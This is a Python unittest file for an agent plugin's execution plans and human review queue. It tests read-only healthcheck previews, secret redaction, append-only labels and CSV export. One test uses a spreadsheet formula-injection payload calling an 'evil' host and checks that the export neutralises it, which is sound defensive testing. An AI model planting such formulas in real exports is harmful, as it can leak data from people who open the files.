import csv
import hashlib
import importlib.util
import json
import tempfile
import unittest
from pathlib import Path

SKILL_DIR = Path(__file__).resolve().parents[1]
PLUGIN_DIR = SKILL_DIR / "plugin"


def load_module(name, path):
    spec = importlib.util.spec_from_file_location(name, str(path))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

execution_plan = load_module("execution_plan", PLUGIN_DIR / "execution_plan.py")
review_queue = load_module("review_queue", PLUGIN_DIR / "review_queue.py")


class V245ReviewQueueTests(unittest.TestCase):
    def test_healthcheck_preview_uses_canonical_plan_and_peer_map(self):
        plan = execution_plan.build_execution_plan(
            "hmp-healthcheck", "1.0.0", {"peer_list": ["peer128"], "timeout_seconds": 5}
        )
        self.assertEqual(plan["preview_schema_version"], "1.0")
        self.assertEqual(plan["preview_status"], "exact")
        self.assertEqual(plan["effect_class"], "read_only")
        self.assertEqual(plan["target_peer_id"], "peer128")
        self.assertEqual(plan["target_resolution_source"], "peer_map")
        self.assertEqual(plan["executor_kind"], "http_get")
        self.assertEqual(plan["method"], "GET")
        self.assertEqual(plan["endpoint"], "http://192.168.178.112:18643/hmp/health")
        self.assertEqual(plan["timeout_seconds"], 5)
        self.assertEqual(plan["auth_mode"], "none")
        self.assertFalse(plan["mutation_possible"])
        preview = execution_plan.redact_execution_plan(plan)
        self.assertEqual(preview["command_preview"], "GET http://192.168.178.112:18643/hmp/health")
        self.assertFalse(preview["credentials_exposed_in_preview"])

    def test_unsupported_peer_gets_non_executable_preview(self):
        plan = execution_plan.build_execution_plan(
            "hmp-healthcheck", "1.0.0", {"peer_list": ["peer999"]}
        )
        self.assertEqual(plan["preview_status"], "unsupported")
        self.assertEqual(plan["target_peer_id"], "peer999")
        self.assertEqual(plan["executor_kind"], "unresolved")
        self.assertIsNone(plan["endpoint"])
        preview = execution_plan.redact_execution_plan(plan)
        self.assertIn("NOT EXECUTABLE", preview["command_preview"])
        self.assertFalse(preview["credentials_exposed_in_preview"])

    def test_actor_identity_and_transport_are_orthogonal(self):
        requester = review_queue.normalize_requester({
            "actor_type": "human",
            "actor_id": "telegram_user:sha256:abc123",
            "request_channel": "hmp",
            "requester_peer_id": "peer106",
            "processing_peer_id": "peer70",
        })
        self.assertEqual(requester["actor_type"], "human")
        self.assertEqual(requester["request_channel"], "hmp")
        self.assertEqual(requester["requester_peer_id"], "peer106")
        self.assertEqual(requester["processing_peer_id"], "peer70")
        self.assertEqual(requester["requester_type"], "hmp_peer")

    def test_review_record_redacts_raw_text_and_has_stable_id(self):
        event = {
            "event_id": "evt-root",
            "event_type": "retrieval_event",
            "schema_version": "1.2",
            "timestamp": "2026-08-01T00:00:00Z",
            "data": {
                "event_id": "evt-inner",
                "retrieval_event_id": "ret-1",
                "user_message_preview": "check token=SECRET HMP health for peer128",
                "raw_request": "token=SECRET must not export",
                "traffic_type": "organic_peer",
                "provenance": {"source": "hmp", "stream": "organic_live"},
                "requester": {
                    "actor_type": "agent",
                    "actor_id": "hmp:peer106",
                    "request_channel": "hmp",
                    "requester_peer_id": "peer106",
                    "processing_peer_id": "peer70",
                },
                "session_id": "sess", "turn_id": "turn", "task_id": "task",
                "candidates": [
                    {"capability": "hmp-healthcheck@1.0.0", "score": 0.88, "effect_class": "read_only"},
                    {"capability": "peer-heartbeat@1.0.0", "score": 0.41, "effect_class": "read_only"},
                ],
                "score_margin": 0.47,
                "eligibility_result": "eligible_shadow_only",
                "validated_inputs": {"peer_list": ["peer128"], "timeout_seconds": 5},
            },
        }
        rec = review_queue.build_review_record(event, candidate_rank=1)
        expected = hashlib.sha256("evt-root|hmp-healthcheck|1.0.0|1".encode()).hexdigest()[:32]
        self.assertEqual(rec["review_id"], "review_" + expected)
        self.assertEqual(rec["review_schema_version"], "1.0")
        self.assertNotIn("token=SECRET must not export", json.dumps(rec))
        self.assertIn("[REDACTED]", rec["request"]["redacted_text"])
        self.assertEqual(rec["request"]["raw_request_ref"], "event:evt-root")
        self.assertEqual(rec["retrieval"]["candidate_capability"], "hmp-healthcheck@1.0.0")
        self.assertNotIn("selected_capability", json.dumps(rec))
        self.assertEqual(rec["intended_execution"]["preview_status"], "exact")
        self.assertEqual(rec["human_review"]["label"], "")

    def test_append_only_labels_join_latest_and_survive_refresh(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            labels = root / "human-labels.jsonl"
            review_queue.append_human_label(labels, "review_1", "UNSURE", "insufficient_context", "first", "fausto", now="2026-08-01T00:00:00Z")
            review_queue.append_human_label(labels, "review_1", "ACCEPT", "exact_match", "correct", "fausto", supersedes_label_id="label_old", now="2026-08-01T00:01:00Z")
            latest = review_queue.load_latest_labels(labels)
            self.assertEqual(latest["review_1"]["label"], "ACCEPT")
            self.assertEqual(latest["review_1"]["reason_code"], "exact_match")
            self.assertEqual(len(labels.read_text().splitlines()), 2)

    def test_csv_neutralizes_formula_and_excludes_synthetic_from_organic(self):
        records = [
            {
                "review_schema_version": "1.0", "review_id": "review_1", "timestamp": "t",
                "requester": {"actor_type": "agent", "requester_type": "hmp_peer", "requester_id": "hmp:peer106", "requester_peer_id": "peer106", "request_channel": "hmp", "processing_peer_id": "peer70"},
                "request": {"redacted_text": "=IMPORTXML('http://evil')", "traffic_type": "organic_peer", "raw_request_ref": "event:1", "provenance_source": "hmp"},
                "retrieval": {"candidate_capability": "hmp-healthcheck@1.0.0", "candidate_rank": 1, "candidate_score": 0.9, "eligibility_result": "eligible_shadow_only"},
                "intended_execution": {"preview_schema_version": "1.0", "preview_status": "exact", "effect_class": "read_only", "target_peer_id": "peer128", "executor_kind": "http_get", "command_preview": "GET http://x", "mutation_possible": False, "auth_mode": "none", "credentials_exposed_in_preview": False},
                "human_review": {"label": "", "reason_code": "", "notes": "", "reviewer": "", "reviewed_at": ""},
                "formal_holdout_eligible": True,
            },
            {
                "review_schema_version": "1.0", "review_id": "review_2", "timestamp": "t",
                "requester": {"actor_type": "agent", "requester_type": "hmp_peer", "requester_id": "hmp:peer106", "requester_peer_id": "peer106", "request_channel": "hmp", "processing_peer_id": "peer70"},
                "request": {"redacted_text": "acceptance", "traffic_type": "acceptance_test", "raw_request_ref": "event:2", "provenance_source": "hmp"},
                "retrieval": {"candidate_capability": "hmp-healthcheck@1.0.0", "candidate_rank": 1, "candidate_score": 0.9, "eligibility_result": "eligible_shadow_only"},
                "intended_execution": {"preview_schema_version": "1.0", "preview_status": "exact", "effect_class": "read_only", "target_peer_id": "peer128", "executor_kind": "http_get", "command_preview": "GET http://x", "mutation_possible": False, "auth_mode": "none", "credentials_exposed_in_preview": False},
                "human_review": {"label": "", "reason_code": "", "notes": "", "reviewer": "", "reviewed_at": ""},
                "formal_holdout_eligible": False,
            },
        ]
        organic = review_queue.filter_organic_review_records(records)
        self.assertEqual([r["review_id"] for r in organic], ["review_1"])
        out = Path(tempfile.mkdtemp()) / "queue.csv"
        review_queue.write_review_csv(out, organic)
        row = next(csv.DictReader(out.open()))
        self.assertTrue(row["redacted_text"].startswith("'="))


if __name__ == "__main__":
    unittest.main()
